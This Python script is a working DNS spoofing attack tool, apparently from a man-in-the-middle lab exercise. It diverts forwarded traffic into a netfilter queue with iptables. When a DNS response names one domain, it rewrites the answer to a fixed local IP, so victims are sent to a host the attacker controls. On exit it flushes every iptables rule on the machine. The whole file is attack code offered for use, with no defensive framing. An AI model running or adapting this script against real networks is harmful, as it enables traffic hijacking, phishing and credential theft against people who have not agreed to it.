#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import os

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        # print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        if "vbrant.eu" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()


QUEUE_NUM = 0
# insert the iptables FORWARD rule
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
# os.system("iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
# os.system("iptables -I INPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

# instantiate the netfilter queue
queue = netfilterqueue.NetfilterQueue()

try:
    # bind the queue number to our callback `process_packet` and start it
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    # if want to exit, make sure we remove that rule we just inserted, going back to normal.
    os.system("iptables --flush")
finally:
    os.system("iptables --flush")